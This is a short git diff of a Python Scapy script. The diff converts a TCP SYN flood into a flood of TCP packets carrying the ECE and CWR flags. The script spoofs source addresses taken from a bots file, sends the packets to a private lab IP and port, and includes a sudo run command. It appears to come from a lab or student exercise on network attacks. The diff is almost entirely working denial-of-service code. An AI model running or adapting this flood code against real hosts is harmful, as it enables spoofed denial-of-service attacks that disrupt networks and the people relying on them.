@@ -5,7 +5,7 @@ import time
 import sys
 import ipaddress
 
-# TCP SYN Flood
+# TCP ECE/CWR
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
 BOTFILE = "../bots.txt"
@@ -23,8 +23,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_tcp_flood_attack():
-    """TCP SYN Flood Attack"""
+def run_tcp_ece_cwr():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -37,7 +36,7 @@ def run_tcp_flood_attack():
         ip_layer = IP(src=source_ip, dst=TARGET_IP)
         eth_layer = Ether()
         seq_num = random.randint(0, 4294967295)
-        tcp_layer = TCP(sport=RandShort(),dport=TARGET_PORT, flags='S', seq=seq_num, window=8192)
+        tcp_layer = TCP(sport=RandShort(),dport=TARGET_PORT, flags='EC', seq=seq_num, window=8192) # ECE and CWR
 
 
         packet = eth_layer / ip_layer / tcp_layer 
@@ -59,6 +58,6 @@ def run_tcp_flood_attack():
 
 
 if __name__ == "__main__":
-    run_tcp_flood_attack()
+    run_tcp_ece_cwr()
 
-# sudo PYTHONPATH=$HOME/scapy python3 tcp_syn_flood.py
+# sudo PYTHONPATH=$HOME/scapy python3 tcp_ece_cwr.py
